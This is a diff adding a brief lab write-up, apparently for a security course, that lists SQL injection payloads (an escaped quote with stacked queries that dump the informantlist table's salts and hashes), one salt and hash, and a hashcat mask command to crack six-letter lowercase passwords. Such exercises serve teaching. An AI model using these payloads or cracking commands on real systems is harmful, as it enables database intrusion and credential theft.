@@ -1,0 +1,30 @@
+# I first noticed that character escaping a single quotation mark and ending the
+# SQL query with a semicolon executed the query on the back end returning a empty
+# table list. Once we realize this we only need to figure out how to input another
+# query of our own following this expression
+
+\';
+
+# Displayed informantlist table of the database
+
+\'; show tables;
+
+# SQL injection revealing all information in tables including salts and hashes
+
+\'; select * from informantlist where 1=1;
+
+# SQL injection specifically requesting for my id
+
+\'; select * from informantlist where id=44951;
+
+# I stored the salt in a file called salt.txt and the corresponding
+# hash in hash.txt
+
+Salt: kqDrjz 
+Hash: 2c27931c15839c6d5de2d955dce2f87a
+
+# Brute force hashcat code masking 26^6 possible combinations of lowercase characters, ?l,
+# as given  by the project spec and output into a file called cracked.txt.
+# The cracked hash had the  following format hashcode:salt:password
+
+hashcat -a 3 -m 20 --potfile-disable -e salt.txt hash.txt ?l?l?l?l?l?l -o cracked.txt
